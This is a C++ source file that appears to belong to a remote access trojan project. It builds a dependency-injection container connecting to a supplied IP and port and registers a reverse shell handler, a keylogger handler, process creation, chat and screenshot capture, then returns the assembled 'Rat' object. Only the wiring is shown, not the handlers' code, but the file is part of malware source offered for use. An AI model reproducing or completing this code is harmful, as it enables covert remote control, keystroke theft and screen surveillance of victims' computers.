#include "IRat.h"

#include "ChatHandler.h"
#include "CommunicationContainerBuilder.h"
#include "CreateProcessHandler.h"
#include "KeyLoggerHandler.h"
#include "Rat.h"
#include "ReverseShellHandler.h"
#include "TakeScreenshotHandler.h"
#include "Screenshotter.h"

std::shared_ptr<Hypodermic::Container> CreateContainer(
	const std::shared_ptr<ICommunicationFactory> factory,
	const char* ip,
	const int port)
{
	Hypodermic::ContainerBuilder builder;

	const auto communicationsBuilder = CommunicationContainerBuilder(
		factory,
		ip,
		port);

	builder.addRegistrations(communicationsBuilder);

	builder.registerType<ReverseShellHandler>()
		.as<IMessageHandler>();

	builder.registerType<KeyLoggerHandler>()
		.as<IMessageHandler>();

	builder.registerType<ChatHandler>()
		.as<IMessageHandler>();

	builder.registerType<CreateProcessHandler>()
		.as<IMessageHandler>();

	builder.registerType<Screenshotter>();

	builder.registerType<TakeScreenshotHandler>()
		.as<IMessageHandler>();

	builder.registerType<Rat>()
		.as<IRat>();

	return builder.build();
}

std::shared_ptr<IRat> CreateRat(
	const std::shared_ptr<ICommunicationFactory> factory,
	const char* ip,
	const int port)
{
	const auto container = CreateContainer(factory, ip, port);

	return container->resolve<IRat>();
}